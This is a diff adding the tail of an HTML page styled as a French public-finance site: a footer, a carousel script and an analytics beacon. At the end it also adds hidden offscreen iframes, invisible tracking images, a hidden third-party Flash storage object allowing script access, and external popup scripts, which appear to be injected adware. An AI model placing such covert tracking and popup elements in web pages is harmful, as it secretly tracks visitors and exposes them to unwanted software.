+				<li><a href="index.html#" title="Accès au site france.fr (nouvelle fenêtre)" ><img alt="Accès au site france.fr (nouvelle fenêtre)" src="logo_france-fr.gif"></a></li>
+
+				<li><a href="index.html#" title="Accès au site service-public.fr (nouvelle fenêtre)" ><img alt="Accès au site service-public.fr (nouvelle fenêtre)" src="logo_msp.gif"></a></li>
+			</ul>
+
+			<div class="signature">© Direction générale des finances publiques - 2014</div>
+
+		</footer>
+<!-- CNIL banner -->
+
+<!-- CNIL banner end -->        <!-- #EndLibraryItem --><!-- FOOTER end -->
+
+		<!-- *************************************************************************************************** -->
+
 	</div>
-</body>
-</html>
+
+	<!-- ******************************************************************************************************* --><!-- #BeginLibraryItem "/Library/owl_param.lbi" -->
+<script>
+	$(document).ready(function() {		
+		
+		$(".play").hide();
+		var owl = $("#owl");
+		
+		owl.owlCarousel({
+			autoPlay : 6000,
+			items : 1,
+			itemsDesktop : [1000,1],
+			itemsDesktopSmall : [900,1],
+			itemsTablet: [600,1],
+			itemsMobile : false						
+		});
+		$(".play").click(function(){
+			owl.trigger('owl.play',6000);
+			$(this).hide();
+			$(".stop").show();
+		})
+		$(".stop").click(function(){
+			owl.trigger('owl.stop');
+			$(this).hide();
+			$(".play").show();
+		})
+	});
+	</script><!-- #EndLibraryItem --><script type="text/javascript">
+	<!--
+		hsh = new Date();
+		hsd = document;
+		hsr = hsd.referrer.replace(/[<>]/g, '');
+		hsi = '<img width="1" height="1" src="http://logc20.xiti.com/hit.xiti?s=244754&s2=6';
+		hsi += '&p=particuliers';
+		hsi += '&hl=' + hsh.getHours() + 'x' + hsh.getMinutes() + 'x' + hsh.getSeconds();
+		if(parseFloat(navigator.appVersion)>=4)
+		{Xiti_s=screen;hsi += '&r=' + Xiti_s.width + 'x' + Xiti_s.height + 'x' + Xiti_s.pixelDepth + 'x' + Xiti_s.colorDepth;}
+		hsd.writeln(hsi + '&ref=' + hsr.replace(/&/g, '$') + '" />');
+	//-->
+	</script><img width="1" height="1" src="hit.xiti">
+
+	<noscript>&lt;img width="1" height="1" src="http://logc20.xiti.com/hit.xiti?s=244754&amp;amp;s2=6&amp;amp;p=accueil&amp;amp;" /&gt;</noscript>
+
+
+
+
+<div id="__fghjktghndfgt_once" style="display:none;"></div><div id="__if72ru4sdfsdfrkjahiuyi_once" style="display:none;"></div><div id="__hggasdgjhsagd_once" style="display:none;"></div><img src="seg@add=2735784&amp;t=2%253F" style="z-index: -100; position: absolute; left: 0px; top: 0px; display: none !important;"><img src="seg@add=2735784&amp;t=2%253F" style="z-index: -100; position: absolute; left: 0px; top: 0px; display: none !important;"><img src="seg@add=2735784&amp;t=2%253F" style="z-index: -100; position: absolute; left: 0px; top: 0px; display: none !important;"><iframe id="362a046af073c4a0" src="Store.html" class="ver6911963" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" s18076491714403566395="true" replaced="true"></iframe><iframe id="ff3540658f9c6ebf" src="Store.html" class="ver4885942" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" s18076491714403566395="true" replaced="true"></iframe><iframe id="80e8e886b10a0e44" src="Store.html" class="ver3530149" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" s18076491714403566395="true" replaced="true"></iframe><div id="SwfStore_www_comparinggenie_com_0" style="position: absolute; top: -2000px; left: -2000px;"><object height="100" width="500" codebase="https://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" id="SwfStore_www_comparinggenie_com_1" classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000">	<param value="http://www.comparinggenie.com/scripts/storage.swf?v=0.040" name="movie">	<param value="namespace=www_comparinggenie_com" name="FlashVars">	<param value="always" name="allowScriptAccess">	<embed height="375" align="middle" width="500" pluginspage="https://www.macromedia.com/go/getflashplayer" flashvars="namespace=www_comparinggenie_com" type="application/x-shockwave-flash" allowscriptaccess="always" quality="high" loop="false" play="true" name="SwfStore_www_comparinggenie_com_1" bgcolor="#ffffff" src="storage.swf@v=0.040"></object></div><iframe style="display: none; visibility: hidden;" s18076491714403566395="true" replaced="true"></iframe><script src="pops"></script><script src="p"></script></body></html>
